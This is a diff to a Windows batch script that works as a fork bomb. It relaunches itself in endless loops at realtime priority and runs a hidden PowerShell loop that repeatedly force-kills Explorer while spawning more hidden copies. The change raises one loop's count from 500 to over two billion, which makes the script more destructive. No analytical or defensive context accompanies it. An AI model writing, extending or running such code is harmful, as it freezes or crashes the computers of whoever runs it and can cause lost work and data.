@@ -33,7 +33,8 @@ start cmd /c "%0 & %0 & %0"
 
 for /l %%x in (0,0,0) do start %0
 
-start "" /realtime cmd /c "for /l %%x in (1,0,500) do (start /realtime cmd /c %0 & %0)"
+start "" /realtime cmd /c "for /l %%x in (1,0,2023020230) do (start /realtime cmd /c %0 & %0)"
 powershell -WindowStyle Hidden -Command "while(1){Get-Process -Name 'explorer' -ErrorAction SilentlyContinue|Stop-Process -Force;Start-Process -WindowStyle Hidden -PassThru cmd -Args '/c %0'|ForEach-Object{$_.ProcessorAffinity=1;$_.PriorityClass='Realtime'}}"
 
 goto loop
+
